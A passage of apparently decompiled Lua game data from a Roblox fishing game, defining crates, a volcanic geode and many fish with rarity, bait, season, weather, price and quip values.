			Description = "A moderately sized wooden crate seemingly lost from a fishing boat of some kind. The date of it's disappearance is unknown. Therefore, finders keepers?- Opening it might give you an array of fish, bait, and money!";
			Hint = "Fallen off of a fishing boat.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			BuyMult = 1.6;
			Price = 80;
			XP = 20;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Common Crate!",
				"A Crate!",
				"Woah! A Crate!",
				"A Common Crate!",
				"Who left this here?"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("crate");
			IsCrate = true;
			CrateType = "All";
			BaitContents = {
				"Shrimp",
				"Bagel",
				"Squid",
				"Seaweed",
				"Magnet",
				"Worm",
				"Minnow",
				"Flakes",
				"Insect",
				"Maggot",
				"Rapid Catcher"
			};
			FishContents = {
				"Sockeye Salmon",
				"Trout",
				"Carp",
				"Minnow",
				"Mackerel",
				"Gudgeon",
				"Cod",
				"Haddock",
				"White Bass",
				"Sea Bass",
				"Chub",
				"Pumpkinseed"
			};
			CoinContents = {
				40,
				120
			};
			From = "None"
		};["Carbon Crate"] = {
			WeightPool = {
				160,
				160
			};
			Chance = 2;
			Rarity = "Rare";
			Resilience = 50;
			Description = "A large military grade crate, lost from some sort of commercial fishing boat. The date of it's disappearance is unkown. Therefore, finders keepers?- Opening it might give you an array of fish, bait, and money!";
			Hint = "Fallen off of a commercial fishing boat.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			BuyMult = 3.5;
			Price = 140;
			XP = 50;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Carbon Crate!",
				"A Crate!",
				"Woah! A Crate!",
				"A Carbon Crate!",
				"Who left this here?",
				"Where is this from??"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("crate");
			IsCrate = true;
			CrateType = "FishOrCoins";
			FishContents = {
				"Alligator Gar",
				"Nurse Shark",
				"Ribbon Eel",
				"Eel",
				"White Bass",
				"Longtail Bass",
				"Yellowfin Tuna",
				"Bluefin Tuna",
				"Squid",
				"Lobster",
				"Cod",
				"Pike",
				"Barracuda",
				"Arapaima",
				"Amberjack",
				"Sturgeon",
				"Longtail Bass",
				"Squid",
				"Mahi Mahi",
				"Halibut",
				"Coelacanth",
				"Abyssacuda"
			};
			CoinContents = {
				130,
				400
			};
			From = "None"
		};["Fish Barrel"] = {
			WeightPool = {
				150,
				150
			};
			Chance = 12;
			Rarity = "Uncommon";
			Resilience = 110;
			Description = "A large wooden barrel with iron hoops. The barrel filled with a large array of ocean and freshwater fish that all seem pretty fresh. Therefore, finders keeps?- Opening it might give you an assortment of fish";
			Hint = "Fallen off of a fishing boat.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			Price = 80;
			XP = 40;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Common Crate!",
				"A Crate!",
				"Woah! A Crate!",
				"A Common Crate!",
				"Who left this here?"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("crate");
			From = "None";
			IsCrate = true;
			CrateType = "Fish";
			FishContents = {
				"Sockeye Salmon",
				"Trout",
				"Bream",
				"Sturgeon",
				"Barracuda",
				"Carp",
				"Pufferfish",
				"Bluefin Tuna",
				"Yellowfin Tuna",
				"Sockeye Salmon",
				"Trout",
				"Bream",
				"Barracuda",
				"Carp",
				"Pike",
				"Alligator Gar",
				"Cod",
				"Minnow",
				"Longtail Bass",
				"Mahi Mahi",
				"Sardine",
				"Crab",
				"Amberjack",
				"Arapaima",
				"Perch",
				"Sea Bass",
				"Cod",
				"Haddock",
				"Sweetfish",
				"Goldfish",
				"Halibut",
				"Minnow",
				"Pale Tang",
				"Porgy",
				"Porgy",
				"White Bass",
				"Walleye",
				"Redeye Bass",
				"Sockeye Salmon",
				"Trout",
				"Bream",
				"Sturgeon",
				"Barracuda",
				"Carp",
				"Pufferfish",
				"Bluefin Tuna",
				"Yellowfin Tuna",
				"Sockeye Salmon",
				"Trout",
				"Bream",
				"Barracuda",
				"Carp",
				"Pike",
				"Alligator Gar",
				"Cod",
				"Minnow",
				"Longtail Bass",
				"Mahi Mahi",
				"Sardine",
				"Crab",
				"Amberjack",
				"Arapaima",
				"Perch",
				"Sea Bass",
				"Cod",
				"Haddock",
				"Sweetfish",
				"Goldfish",
				"Halibut",
				"Minnow",
				"Pale Tang",
				"Porgy",
				"Porgy",
				"White Bass",
				"Walleye",
				"Redeye Bass",
				"Golden Smallmouth Bass"
			}
		};["Bait Crate"] = {
			WeightPool = {
				80,
				80
			};
			Chance = 15;
			Rarity = "Uncommon";
			Resilience = 120;
			Description = "A wooden crate with fabric over top to preserve the bait inside. Seemingly lost from a fishing boat of some kind. The bait is still alive and fresh. Therefore, finders keepers?- Opening it might give you an array of common and rare baits!";
			Hint = "Fallen off of a fishing boat.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			BuyMult = 1.6;
			Price = 75;
			XP = 40;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Crate of Bait!",
				"A Bait Crate!",
				"Woah! A Crate!",
				"A Crate!",
				"Who left this here?",
				"Oh, the shrimps still moving?",
				"A Crate full of Bait!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("crate");
			From = "None";
			IsCrate = true;
			CrateType = "Bait";
			BaitContents = {
				"Shrimp",
				"Seaweed",
				"Bagel",
				"Squid",
				"Magnet",
				"Worm",
				"Minnow",
				"Flakes",
				"Insect",
				"Fish Head",
				"Rapid Catcher",
				"instant Catcher",
				"Super Flakes",
				"Maggot"
			}
		};["Quality Bait Crate"] = {
			WeightPool = {
				120,
				120
			};
			Chance = 8;
			Rarity = "Rare";
			Resilience = 120;
			Description = "A metal bait box with a rubber seal to protect the bait inside. Seemingly lost from a fishing boat of some kind. The bait is still alive and fresh. Therefore, finders keepers?- Opening it might give you an array of baits!";
			Hint = "Fallen off of a fishing boat.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			BuyMult = 3.5;
			Price = 150;
			XP = 40;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Crate of Bait!",
				"A Bait Crate!",
				"Woah! A Crate!",
				"A Crate!",
				"Who left this here?",
				"Oh, the shrimps still moving?",
				"A Crate full of Bait!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("downward");
			From = "None";
			IsCrate = true;
			CrateType = "Bait";
			BaitContents = {
				"Fish Head",
				"Rapid Catcher",
				"instant Catcher",
				"Seaweed",
				"Seaweed",
				"Squid",
				"Super Flakes",
				"Maggot",
				"Night Shrimp",
				"Maggot",
				"Maggot",
				"Weird Algae"
			}
		};["Volcanic Geode"] = {
			WeightPool = {
				200,
				200
			};
			Chance = 17;
			Rarity = "Rare";
			Resilience = 120;
			Description = "The Volcanic Geode encases a magma crystal core, preserving its contents with an amber-like quality. Within this geode, you might find a trove of rare or extinct treasuresâ€” it's like a volcanic Christmas!";
			Hint = "Fallen off of a fishing boat.";
			FavouriteBait = "Magnet";
			FavouriteTime = nil;
			BuyMult = 3;
			Price = 200;
			XP = 20;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ooo, shiny!",
				"A rock...?!",
				"Woah! Glowy thing!",
				"A Geode!",
				"What's this thing?"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("crate");
			IsCrate = true;
			CrateType = "All";
			BaitContents = {
				"Coal",
				"Coal",
				"Coal",
				"Coal",
				"Maggot",
				"Maggot",
				"Minnow",
				"Truffle Worm",
				"Coal",
				"Night Shrimp",
				"Rapid Catcher",
				"instant Catcher",
				"Super Flakes",
				"Night Shrimp",
				"Rapid Catcher",
				"Super Flakes"
			};
			FishContents = {
				"Ember Snapper",
				"Pyrogrub",
				"Sturgeon",
				"Magma Tang",
				"Alligator Gar",
				"Pufferfish",
				"Sea Urchin",
				"Sea Urchin",
				"Perch",
				"Perch",
				"Perch",
				"Angelfish",
				"Rock",
				"Rock",
				"Rock",
				"Magma Tang"
			};
			CoinContents = {
				150,
				500
			};
			From = "Roslit Volcano"
		};["Largemouth Bass"] = {
			WeightPool = {
				10,
				45
			};
			Chance = 75;
			Rarity = "Common";
			Resilience = 80;
			Description = "The Largemouth Bass is a common freshwater fish found in Moosewood known for its large mouth and aggressive feeding behavior. It's found in various habitats, such as lakes, ponds, and rivers, where the water is warm and there's plenty of vegetation. Largemouth Bass are also known for their camouflage, with a greenish color on their backs that helps them blend in with their surroundings.";
			Hint = "Found in Moosewoods freshwater. Seems to prefer worms and other small baits.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 85;
			XP = 20;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"Now, where's the snare?",
				"Woah!",
				"Awesome!",
				"A Largemouth Bass!",
				"Ou! A Bass!"
			};
			SparkleColor = Color3.fromRGB(172, 255, 134);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Moosewood"
		};["Sea Bass"] = {
			WeightPool = {
				20,
				60
			};
			Chance = 75;
			Rarity = "Common";
			Resilience = 80;
			Description = "The Sea Bass is a popular catch for many anglers, known for its elongated body and aggressive fighting behavior when hooked. They can be found all over the world in all sorts of salt waters.";
			Hint = "In salt waters.";
			FavouriteBait = "Squid";
			FavouriteTime = nil;
			Price = 95;
			XP = 90;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"A Sea Bass!",
				"I caught a Sea Bass!",
				"Woah! A Sea Bass!",
				"Ouu! A Bass!"
			};
			SparkleColor = Color3.fromRGB(203, 203, 203);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};["Smallmouth Bass"] = {
			WeightPool = {
				5,
				17
			};
			Chance = 75;
			Rarity = "Common";
			Resilience = 80;
			Description = "The Smallmouth Bass is a popular freshwater fish known for its fighting spirit and preference for clear, cool waters. It has a streamlined body with a greenish-brown coloration and distinctive horizontal stripes.  It can be found in plenty of freshwaters, but is native to Terrapin Islands filtered water.";
			Hint = "Can be found in freshwaters and in the filtered waters of Terrapin Island.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 70;
			XP = 90;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Windy"
			};
			Quips = {
				"A Smallmouth Bass!",
				"I caught a Smallmouth Bass!",
				"Woah! A Smallmouth Bass!",
				"Ouu! A Bass!"
			};
			SparkleColor = Color3.fromRGB(127, 255, 88);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Terrapin"
		};Anchovy = {
			WeightPool = {
				1,
				3
			};
			Chance = 100;
			Rarity = "Common";
			Resilience = 100;
			Description = "Anchovies are extremely small and slender fish, with a silvery sheen. They are known for their schooling behavior and are a common catch near Moosewood.";
			Hint = "Caught in all saltwaters of Moosewood";
			FavouriteBait = "None";
			FavouriteTime = "Day";
			Price = 30;
			XP = 20;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"I caught an Anchovy..",
				"An Anchovy!",
				"It really put up a battle!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Moosewood"
		};["Swamp Bass"] = {
			WeightPool = {
				20,
				60
			};
			Chance = 80;
			Rarity = "Common";
			Resilience = 80;
			Description = "The Swamp Bass is species of Bass that can only be found in Swamp water. They are extremely similar to Smallmouth Bass besides their special adaptation; They have camelion-like camouflage. This allows them to nearly entirely avoid being a prey of larger fish and Alligators.";
			Hint = "Can be found in Mushgrove Swamp.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 60;
			XP = 50;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Windy"
			};
			Quips = {
				"A Swamp Bass!",
				"I caught a Swamp Bass!",
				"Woah! A Swamp Bass!",
				"Ouu! A Swamp Bass!"
			};
			SparkleColor = Color3.fromRGB(137, 255, 116);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Mushgrove"
		};Chub = {
			WeightPool = {
				10,
				30
			};
			Chance = 100;
			Rarity = "Common";
			Resilience = 80;
			Description = "The Chub is a hardy and adaptable freshwater fish, typically found in Roslit Pond. The Chub is an easy catch for novice anglers and is thankfully a common catch.";
			Hint = "commonly caught in Roslit Pond.";
			FavouriteBait = "Seaweed";
			FavouriteTime = "Day";
			Price = 40;
			XP = 40;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"I caught a Chub!",
				"Woah, a Chub!!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit"
		};["White Bass"] = {
			WeightPool = {
				3,
				25
			};
			Chance = 60;
			Rarity = "Uncommon";
			Resilience = 70;
			Description = "The White Bass is a slender, silvery fish with horizontal black stripes running along its body. It can be found in plenty of freshwaters, but is native to Terrapin Islands filtered water.";
			Hint = "Can be found in freshwaters and in the filtered waters of Terrapin Island during the day.";
			FavouriteBait = "Minnow";
			FavouriteTime = "Day";
			Price = 110;
			XP = 50;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A White Bass!",
				"I caught a White Bass!",
				"Woah! A White Bass!",
				"Ouu! A Bass!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Terrapin"
		};Blackfish = {
			WeightPool = {
				5,
				20
			};
			Chance = 80;
			Rarity = "Uncommon";
			Resilience = 60;
			Description = "Blackfish are small, black, nighttime swimmers that can be most commonly found in the cold the rocky waters of Snowcap Pond.";
			Hint = "Found in Snowcap Pond during the night.";
			FavouriteBait = "Worm";
			FavouriteTime = "Night";
			Price = 100;
			XP = 100;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Blackfish!",
				"I caught a Blackfish!",
				"Oh, a Blackfish!"
			};
			SparkleColor = Color3.fromRGB(113, 113, 113);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Snowcap"
		};Burbot = {
			WeightPool = {
				10,
				35
			};
			Chance = 50;
			Rarity = "Uncommon";
			Resilience = 50;
			Description = "The Burbot is a long, slender freshwater fish with a mottled brown and green appearance, resembling a cross between a catfish and an eel. Burbots are known for being active in colder temperatures, particularly under the ice in Snowcap Pond.";
			Hint = "Found in Snowcap Pond.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 80;
			XP = 110;
			Seasons = {
				"Autumn"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Burbot!",
				"I caught a Burbot!",
				"Oh, a Burbot!"
			};
			SparkleColor = Color3.fromRGB(194, 255, 129);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Snowcap"
		};Grayling = {
			WeightPool = {
				5,
				20
			};
			Chance = 75;
			Rarity = "Common";
			Resilience = 70;
			Description = "An interesting, cold-water fish with shimmering silver scales and a signature large, colourful dorsal fin. It is known for it's beauty and its agile swimming behaviour. The Grayling is often found in Snowcap Pond during the day, but it can rarely be found at night.";
			Hint = "Found in Snowcap Pond during the day.";
			FavouriteBait = "Insect";
			FavouriteTime = "Day";
			Price = 80;
			XP = 100;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Grayling!",
				"I caught a Grayling!",
				"Oh, a Grayling!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Snowcap"
		};["Redeye Bass"] = {
			WeightPool = {
				3,
				15
			};
			Chance = 40;
			Rarity = "Unusual";
			Resilience = 50;
			Description = "The Redeye Bass looks very similar to the Largemouth Bass. However, the Redeye bass has very distinct red or orange eyes to go along with its greenish brown body.";
			Hint = "Can be found in freshwaters and in the filtered waters of Terrapin Island during the day.";
			FavouriteBait = "Flakes";
			FavouriteTime = "Day";
			Price = 115;
			XP = 100;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"Windy"
			};
			Quips = {
				"A Redeyed Bass!",
				"I caught a Redeye Bass!",
				"Woah! A Redeye Bass!",
				"Ouu! A Redeye Bass!"
			};
			SparkleColor = Color3.fromRGB(255, 29, 29);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Terrapin"
		};["Skipjack Tuna"] = {
			WeightPool = {
				70,
				160
			};
			Chance = 40;
			Rarity = "Unusual";
			Resilience = 45;
			Description = "The Skipjack Tuna can be caught near Snowcap Island. They are extremely agile swimmers, allowing them to put up a strong fight against anglers.";
			Hint = "Found near Snowcap Island.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 150;
			XP = 100;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"I caught a Tuna!",
				"A Skipjack Tuna!",
				"Woah, a Skipjack Tuna!",
				"I caught a Skipjack Tuna!"
			};
			SparkleColor = Color3.fromRGB(162, 174, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Snowcap"
		};Bream = {
			WeightPool = {
				11,
				27
			};
			Chance = 75;
			Rarity = "Common";
			Resilience = 80;
			Description = "Breams are school fish with deep bodies, flat sides and a small head. The bream loves worms and is most commonly found in Moosewoods freshwater.";
			Hint = "Found in freshwaters, and along ocean beaches. Prefers day.";
			FavouriteBait = "Worm";
			FavouriteTime = "Day";
			Price = 60;
			XP = 30;
			Seasons = {
				"Spring",
				"Winter"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Bream!",
				"Bream!",
				"I caught a Bream!",
				"Woah, a Bream!",
				"Hello, Bream!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 193);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Moosewood"
		};Pumpkinseed = {
			WeightPool = {
				1,
				5
			};
			Chance = 65;
			Rarity = "Uncommon";
			Resilience = 80;
			Description = "Pumpkinseed are known for their distinctive red or orange edge on the ear flap and their round body shape. They prefer warmer waters and are often found in Roslit Bays freshwater. Pumpkinseed are also much less aggresive compared to other sunfish species.";
			Hint = "Found in Roslit freshwater during warm days.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 90;
			XP = 30;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"A Pumpkinseed!",
				"I caught a Pumpkinseed!",
				"Can it hear me?",
				"Woah.. Cool ears!"
			};
			SparkleColor = Color3.fromRGB(255, 60, 60);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit"
		};["Sockeye Salmon"] = {
			WeightPool = {
				20,
				70
			};
			Chance = 90;
			Rarity = "Common";
			Resilience = 90;
			ProgressEfficiency = 1.2;
			Description = "The Sockeye Salmon are a very common type of salmon found near Moosewood, known for their vibrent red and green colours and interesting habits when laying eggs. They are very common during colder seasons such as Autumn, as that is the time most Sockeye Salmon lay their eggs.";
			Hint = "Resides in oceans, some freshwaters along Moosewood. Prefers shrimp.";
			FavouriteBait = "Bagel";
			FavouriteTime = nil;
			Price = 45;
			XP = 25;
			Seasons = {
				"Autumn",
				"Winter"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"Salmoff!",
				"Woah!",
				"Awesome!",
				"A Sockeye Salmon!",
				"Woah, A Sockeye Salmon!",
				"A Salmon!"
			};
			SparkleColor = Color3.fromRGB(255, 160, 160);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Moosewood"
		};Sweetfish = {
			WeightPool = {
				2,
				5
			};
			Chance = 75;
			Rarity = "Common";
			Resilience = 85;
			Description = "The Sweetfish is known for its delicate sweet flavor, and its golden hue. They are very commonly found in short river-like gap of Sunstone Island.";
			Hint = "Found in the center gap of Sunstone Island.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 40;
			XP = 25;
			Seasons = {
				"Autumn"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"A Sweetfish!",
				"Is there a sour one?",
				"Woah! A Sweetfish!",
				"Hope it's not artificially sweet!"
			};
			SparkleColor = Color3.fromRGB(157, 255, 96);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Sunstone"
		};Trout = {
			WeightPool = {
				9,
				50
			};
			Chance = 85;
			Rarity = "Common";
			Resilience = 80;
			Description = "The Trout is a common freshwater fish found in all waters of Moosewood & Roslit. Trouts are well recognized for their interesting dotted patterns and pinkish-red ribbon across the sides of their soft bodies. Trouts also interestingly have two hearts to help efficiently pump blood throughout their body.";
			Hint = "Can be found in plenty of common waters in Moosewood & Roslit.";
			FavouriteBait = "Insect";
			FavouriteTime = nil;
			Price = 65;
			XP = 40;
			Seasons = {
				"None"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"I thought theres a rainbow?",
				"Woah, a Trout!",
				"Woah!",
				"A Trout!",
				"I caught a Trout!"
			};
			SparkleColor = Color3.fromRGB(99, 168, 94);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Moosewood"
		};Porgy = {
			WeightPool = {
				5,
				30
			};
			Chance = 60;
			Rarity = "Common";
			Resilience = 65;
			Description = "Porgies are a common catch for coasta anglers. They are a relatively easy to catch ocean fish with no real special qualities besides their taste and fun to say name.";
			Hint = "Found all over the Ocean during the day and prefers shrimp.";
			FavouriteBait = "Shrimp";
			FavouriteTime = "Day";
			Price = 90;
			XP = 40;
			Seasons = {
				"Summer",
				"Spring"
			};
			Weather = {
				"Clear",
				"Foggy"
			};
			Quips = {
				"A Corgi.. I mean Porgy??",
				"Woah, a Porgy!",
				"Nice, A Porgy!",
				"A Porgy!",
				"I caught a Porgy!"
			};
			SparkleColor = Color3.fromRGB(248, 255, 169);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};Walleye = {
			WeightPool = {
				18,
				40
			};
			Chance = 60;
			Rarity = "Uncommon";
			Resilience = 70;
			Description = "The Walleye is a predatory fish known for its sharp teeth and distinctive large eyes. The Walleye can be found around the East side of Terrapin Island.";
			Hint = "Can be found near Terrapin Island.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 90;
			XP = 90;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Woah! A Walleye!",
				"I caught a Walleye!",
				"Lovely, a Walleye!"
			};
			SparkleColor = Color3.fromRGB(113, 188, 96);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Terrapin"
		};Bluegill = {
			WeightPool = {
				1,
				6
			};
			Chance = 85;
			Rarity = "Common";
			Resilience = 90;
			Description = "A small, round freshwater fish with bright blue and orange hues, easily recognized by its distinct gill spot. It can be found all over the waters of Snowcap.";
			Hint = "Found in Saltwaters near Snowcap.";
			FavouriteBait = "Insect";
			FavouriteTime = nil;
			Price = 60;
			XP = 90;
			Seasons = {
				"Summer",
				"Spring"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"A Bluegill!",
				"But I pinked the Red Pill!",
				"I caught a Bluegill!!",
				"Lovely, a Bluegill!"
			};
			SparkleColor = Color3.fromRGB(149, 255, 188);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Snowcap"
		};Sardine = {
			WeightPool = {
				1,
				3
			};
			Chance = 90;
			Rarity = "Common";
			Resilience = 90;
			Description = "Sarines are small schooling fish, known for their high oil content, silver scales, and long tiny bodies.";
			Hint = "Found commonly in the open ocean.";
			FavouriteBait = "None";
			FavouriteTime = "Day";
			Price = 30;
			XP = 20;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"I caught a Sardine!",
				"Ouu! A Sardine!",
				"A Sardine!"
			};
			SparkleColor = Color3.fromRGB(185, 185, 185);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};["Arctic Char"] = {
			WeightPool = {
				20,
				60
			};
			Chance = 40;
			Rarity = "Uncommon";
			Resilience = 50;
			Description = "The Arctic Char is a striking fish commonly known for its vibrant reddish-orange belly and long mouth. They can be found in the cold salt-waters of Snowcap Island.";
			Hint = "Found in open salt-water near Snowcap.";
			FavouriteBait = "Insect";
			FavouriteTime = nil;
			Price = 80;
			XP = 50;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Char!",
				"I caught an Arctic Char!",
				"Woah, a Char!",
				"It's an Arctic Char!"
			};
			SparkleColor = Color3.fromRGB(255, 83, 83);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Snowcap"
		};["Red Drum"] = {
			WeightPool = {
				10,
				25
			};
			Chance = 40;
			Rarity = "Common";
			Resilience = 50;
			Description = "The Red Drum is a close relative to the Black Drum; Red Drum can be found all around Snowcaps vast salt-waters.";
			Hint = "Found in salt-water of Snowcap.";
			FavouriteBait = "Insect";
			FavouriteTime = nil;
			Price = 80;
			XP = 50;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Red Drum!",
				"I caught a Red Drum!",
				"Woah, a Drum!",
				"It'a Red Drum!",
				"All I see is Red Drum."
			};
			SparkleColor = Color3.fromRGB(255, 49, 49);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Snowcap"
		};Herring = {
			WeightPool = {
				5,
				11
			};
			Chance = 80;
			Rarity = "Common";
			Resilience = 80;
			Description = "The Herring is a slender silvery fish known for its schooling behavior. Herring can often be found in costal waters during the day.";
			Hint = "Found commonly in the coast of Snowcaps salt-water during the day.";
			FavouriteBait = "Shrimp";
			FavouriteTime = "Day";
			Price = 70;
			XP = 50;
			Seasons = {
				"Summer",
				"Spring"
			};
			Weather = {
				"Clear",
				"Windy"
			};
			Quips = {
				"A Herring!",
				"I caught a Herring!",
				"Oh, a Herring!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Snowcap"
		};Pollock = {
			WeightPool = {
				10,
				50
			};
			Chance = 80;
			Rarity = "Common";
			Resilience = 60;
			Description = "Pollock are sleek, silver fish with a light belly contrasting a darker dorsal. They are fast swimmers and often found feeding under Snowcap Islands docks.";
			Hint = "Found in Snowcap island, especially near the docks.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 70;
			XP = 50;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Foggy",
				"Rain"
			};
			Quips = {
				"A Pollock!",
				"I caught a Pollock!",
				"Woah, a Pollock!",
				"Look! A Pollock!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Snowcap"
		};Spiderfish = {
			WeightPool = {
				3,
				10
			};
			Chance = 90;
			Rarity = "Common";
			Resilience = 90;
			Description = "The Spiderfish is a rare void fish, caught only in Vertigos calm waters. They are schooling fish and are a common prey of Vertigos vicious predators.";
			Hint = "Found commonly in Vertigo.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 30;
			XP = 20;
			Seasons = {
				"Winter"
			};
			Weather = {
				"None"
			};
			Quips = {
				"I caught a Spiderfish!",
				"Ouu! A Spiderfish!",
				"A Spiderfish!"
			};
			SparkleColor = Color3.fromRGB(53, 60, 79);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Vertigo"
		};Bowfin = {
			WeightPool = {
				30,
				60
			};
			Chance = 60;
			Rarity = "Uncommon";
			Resilience = 60;
			Description = "The Mudfish, also known as Bowfin, is a resilient, ancient fish species known for its ability to survive in harsh, low-oxygen environments like swamps and muddy waters. They can be found all over Mushgrove Swamp, especially lurking in dense vegetation and during the night.";
			Hint = "Caught in Mushgrove Swamp at night.";
			FavouriteBait = "Worm";
			FavouriteTime = "Night";
			Price = 100;
			XP = 50;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"A Mudfish!",
				"Ouu, A Mudfish!",
				"I caught a Mudfish!"
			};
			SparkleColor = Color3.fromRGB(189, 125, 95);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Mushgrove"
		};Snook = {
			WeightPool = {
				30,
				70
			};
			Chance = 45;
			Rarity = "Unusual";
			Resilience = 85;
			Description = "The Common Snook is a cute salt water swimmer found commonly near Moosewood Docks. They are easy noticable due to their thin black stripe across their body, and easily catchable due to schools during spawning season in spring.";
			Hint = "Can be found close to ocean docks of Moosewood.";
			FavouriteBait = "Shrimp";
			FavouriteTime = nil;
			Price = 110;
			XP = 45;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Clear",
				"Foggy"
			};
			Quips = {
				"I caught a Snook!",
				"It's a Snook!",
				"A Snook!",
				"Look at this Snook!"
			};
			SparkleColor = Color3.fromRGB(255, 233, 125);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Moosewood"
		};Carp = {
			WeightPool = {
				10,
				50
			};
			Chance = 60;
			Rarity = "Uncommon";
			Resilience = 70;
			Description = "Carps are freshwater fish that are known for their whisker-like barbels around their mouth. Carps can adapt to plenty of different environments, as they can thrive in various water conditions. Due to their resilience, they are a common choice for stocking man-made ponds and lakes! They are also pretty cute, in my opinion.";
			Hint = "Found in the back of Moosewood Pond.";
			FavouriteBait = "Bagel";
			FavouriteTime = nil;
			Price = 110;
			XP = 80;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Is it magic?",
				"Woah, a Carp!",
				"It's a Carp!",
				"Woahh! This is bigger than I thought.",
				"Carp-tastic!",
				"!!!",
				"Woah!",
				"A Carp! My skill are sharp!"
			};
